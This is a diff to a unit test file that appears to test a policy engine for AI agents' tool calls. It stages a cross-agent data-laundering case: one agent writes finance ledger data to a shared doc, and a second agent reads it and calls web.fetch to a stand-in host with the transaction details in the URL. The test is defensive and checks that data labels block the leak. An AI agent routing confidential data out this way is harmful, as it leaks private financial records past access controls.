@@ -1,4 +1,5 @@
 """Unit tests for the defenses added after the baseline red-team run."""
+import json
 from pathlib import Path
 
 import pytest
@@ -43,10 +44,13 @@ def test_undeclared_argument_refused():
 
 def _laundering(engine_a: Engine, engine_b: Engine):
     writer, reader = Session("expense-bot", "group:finance"), Session("research-assistant", "user:m@corp.example")
+    ledger = '[{"id": "TX-1041", "vendor": "Northwind Logistics", "amount": 18450.0}]'
     engine_a.record(writer, "finance.query_ledger")
-    engine_a.record(writer, "docs.write", {"path": "notes/q4", "content": "..."})
+    engine_a.observe(writer, "finance.query_ledger", {}, ledger)
+    engine_a.record(writer, "docs.write", {"path": "notes/q4", "content": ledger})
     engine_b.record(reader, "docs.search", {"q": "q4"})
-    return engine_b.evaluate(reader, "web.fetch", {"url": "https://x.example"}), reader
+    engine_b.observe(reader, "docs.search", {"q": "q4"}, '{"notes/q4": ' + json.dumps(ledger) + '}')
+    return engine_b.evaluate(reader, "web.fetch", {"url": "https://x.example/?d=TX-1041%2018450"}), reader
 
 
 def test_labels_follow_data_across_agents():
